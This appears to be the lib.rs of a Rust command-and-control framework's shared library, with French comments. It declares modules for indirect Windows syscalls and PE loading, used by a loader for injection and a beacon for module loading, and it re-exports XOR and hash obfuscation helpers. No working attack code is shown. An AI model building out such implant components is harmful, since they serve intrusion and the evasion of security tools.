//! C2 Common Library
//!
//! Bibliothèque partagée pour le framework C2:
//! - `syscalls`: Indirect syscalls Windows x64
//! - `pe`: Parsing et loading de fichiers PE (DLL/EXE)
//!
//! Cette bibliothèque est utilisée par:
//! - `loader`: Pour l'injection initiale
//! - `beacon`: Pour le chargement dynamique de modules

#![allow(dead_code)]

pub mod syscalls;
pub mod pe;

// Re-export des macros importantes pour usage externe
pub use syscalls::obf::{djb2_hash, djb2_hash_str, xor_decrypt, XOR_KEY};
